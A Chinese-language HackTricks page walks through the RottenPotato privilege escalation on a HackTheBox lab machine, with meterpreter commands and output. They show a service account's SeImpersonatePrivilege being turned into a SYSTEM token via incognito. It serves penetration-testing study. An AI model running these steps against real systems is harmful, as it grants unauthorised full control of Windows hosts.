# RottenPotato

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零到英雄学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

此页面信息摘自[此帖子](https://www.absolomb.com/2018-05-04-HackTheBox-Tally/)

服务账户通常具有特殊权限（SeImpersonatePrivileges），这可以用来提升权限。

[https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

我不会详细介绍这个漏洞是如何工作的，上面的文章比我能说的更清楚。

让我们用meterpreter检查我们的权限：
```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```
很好，看起来我们拥有执行攻击所需的权限。让我们上传 `rottenpotato.exe`

回到我们的 meterpreter 会话，我们加载 `incognito` 扩展。
```
meterpreter > use incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will beavailable
Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
NT SERVICE\SQLSERVERAGENT
NT SERVICE\SQLTELEMETRY
TALLY\Sarah

Impersonation Tokens Available
========================================
No tokens available
```
我们可以看到我们目前没有模拟令牌。让我们运行Rotten Potato漏洞利用程序。
```
meterpreter > execute -f rottenpotato.exe -Hc
Process 3104 created.
Channel 2 created.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will beavailable
Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
NT SERVICE\SQLSERVERAGENT
NT SERVICE\SQLTELEMETRY
TALLY\Sarah

Impersonation Tokens Available
========================================
NT AUTHORITY\SYSTEM
```
我们需要迅速模仿令牌，否则它将消失。
```
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
[-] Warning: Not currently running as SYSTEM, not all tokens will beavailable
Call rev2self if primary process token is SYSTEM
[-] No delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
成功！我们已经获得了SYSTEM权限的shell，并且可以获取root.txt文件！

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
